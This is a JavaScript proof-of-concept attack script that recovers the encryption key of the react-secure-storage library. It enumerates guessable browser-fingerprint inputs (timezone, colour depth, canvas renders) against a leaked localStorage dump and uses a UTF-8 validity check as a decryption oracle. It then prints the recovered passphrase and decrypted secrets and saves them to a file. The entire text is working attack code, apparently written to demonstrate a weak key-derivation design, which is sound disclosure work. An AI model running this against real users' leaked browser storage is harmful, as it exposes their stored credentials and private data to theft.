// ATTACK 1 — environment reconstruction.
//
// The attacker has:
//   * leaked_localstorage.json  (the encrypted blob)
//   * public_intel.json         (User-Agent + hostname + Accept-Language,
//                                all of which the app already logs for free)
//   * a small corpus of per-platform canvas fingerprints (harvested from the
//                                app's own users / public canvas catalogues;
//                                every user on the same OS+browser+GPU shares
//                                one string)
//   * knowledge that colorDepth is ~always 24 and the timezone is one of ~27
//
// The attacker has NO secret, never imports react-secure-storage, and is never
// told the key, the real timezone, or which canvas the victim used.
const fs = require("fs");
const path = require("path");
const CryptoJS = require("crypto-js");
const { secureKeyFromEnv, fingerprintInt } = require("./fp_recompute");

const dump = JSON.parse(fs.readFileSync(path.join(__dirname, "leaked_localstorage.json")));
const intel = JSON.parse(fs.readFileSync(path.join(__dirname, "public_intel.json")));

// A correct passphrase decrypts EVERY entry to valid UTF-8. A wrong passphrase
// almost always produces "Malformed UTF-8" on at least one entry. No plaintext
// knowledge is needed for this oracle.
function tryDecryptAll(key) {
  const out = {};
  for (const [k, ct] of Object.entries(dump)) {
    let pt;
    try {
      pt = CryptoJS.AES.decrypt(ct, key).toString(CryptoJS.enc.Utf8);
    } catch (e) {
      return null;
    }
    if (!pt || pt.length === 0) return null;
    out[k] = pt;
  }
  return out;
}

// ---- attacker's candidate space (all low-cardinality / public) ----
const colorDepths = [24, 32, 30, 16];
const timezones = [];
for (let h = -12; h <= 14; h++) {
  const n = Math.abs(h);
  const f = ("0" + n).slice(-2);
  timezones.push((h < 0 ? "-" : "+") + f);
}
// Harvested platform-canvas corpus (decoys + the Chrome/Win10/Intel cluster the
// victim's platform actually renders). Canvas output is identical for everyone
// on the same platform, so a handful of strings covers most of a user base.
const canvasCorpus = [
  "data:image/png;base64,FIREFOX-LINUX-MESA-CANVAS-CLUSTER-0001",
  "data:image/png;base64,SAFARI-MACOS-APPLE-SILICON-CANVAS-CLUSTER-0002",
  "data:image/png;base64,CHROME-MACOS-APPLE-SILICON-CANVAS-CLUSTER-0003",
  "data:image/png;base64,CHROME-ANDROID-ADRENO-CANVAS-CLUSTER-0004",
  "data:image/png;base64,EDGE-WIN11-NVIDIA-CANVAS-CLUSTER-0005",
  "data:image/png;base64,CHROME-WIN11-AMD-CANVAS-CLUSTER-0006",
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAB4CAYAAACL-" +
    "WIN10-CHROME-INTEL-UHD-CANVAS-RENDER-CLUSTER-0007",
  "data:image/png;base64,CHROME-WIN10-NVIDIA-CANVAS-CLUSTER-0008",
];

const baseEnv = {
  userAgent: intel.userAgent,
  hostname: intel.hostname,
  language: intel.acceptLanguage,
  systemLanguage: intel.acceptLanguage,
  plugins: "",
  fonts: "",
  cookieEnabled: true,
};

console.log("[attack1] search space:",
  colorDepths.length, "colorDepths x",
  timezones.length, "timezones x",
  canvasCorpus.length, "canvas renders =",
  colorDepths.length * timezones.length * canvasCorpus.length, "candidates");

let tried = 0;
let hit = null;
outer: for (const cd of colorDepths) {
  for (const tz of timezones) {
    for (const canvas of canvasCorpus) {
      tried++;
      const env = { ...baseEnv, colorDepth: cd, timezone: tz, canvas };
      const key = secureKeyFromEnv(env);
      const rec = tryDecryptAll(key);
      if (rec) {
        hit = { key, env, rec, fp: fingerprintInt(env) };
        break outer;
      }
    }
  }
}

if (!hit) {
  console.log("[attack1] no key found in the candidate space");
  process.exit(2);
}

console.log(`[attack1] KEY RECOVERED after ${tried} candidates (no secret used)`);
console.log("[attack1] recovered fingerprint int:", hit.fp, "(32-bit)");
console.log("[attack1] recovered AES passphrase :", hit.key);
console.log("[attack1] matched environment      : colorDepth=" + hit.env.colorDepth +
  " timezone=" + hit.env.timezone + " canvas=…" + hit.env.canvas.slice(-18));
console.log("[attack1] decrypted secrets:");
for (const [k, v] of Object.entries(hit.rec)) {
  console.log("    " + k.padEnd(26) + " = " + v);
}

fs.writeFileSync(
  path.join(__dirname, ".recovered.json"),
  JSON.stringify({ key: hit.key, fp: hit.fp, recovered: hit.rec }, null, 2)
);
